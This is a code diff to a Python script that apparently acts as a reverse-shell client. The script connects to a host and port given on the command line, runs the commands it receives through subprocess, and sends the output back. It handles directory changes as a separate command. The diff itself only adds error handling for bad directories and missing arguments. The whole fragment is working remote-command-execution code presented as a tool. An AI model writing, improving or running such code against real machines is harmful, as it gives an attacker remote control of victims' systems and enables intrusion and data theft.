@@ -33,11 +33,15 @@ def session_handler():
             break
             #Change directory script
         elif message.split(" ")[0] =='cd':
-            directory = str(message.split(" ")[1])
-            os.chdir(directory)
-            cur_dir = os.getcwd()
-            print(f'[+] Changed to {cur_dir}')
-            sock.send(cur_dir.encode())
+            try:
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed to {cur_dir}')
+                sock.send(cur_dir.encode())
+            except FileNotFoundError:
+                outbound('Invalid directory.  Try again')
+                continue
                 
         else:
             #Subprocess command handling
@@ -45,10 +49,15 @@ def session_handler():
             output = command.stdout.read() + command.stderr.read()
             sock.send(output)
 
-
 if __name__ == '__main__':  
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host_ip = sys.argv[1]
-    host_port = int(sys.argv[2])
-    session_handler()
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
+        session_handler()
+    except IndexError:
+        print('[-] Command line argument(s) missing.  Please try again.')
+    except Exception as e:
+        print(e)
+        
 
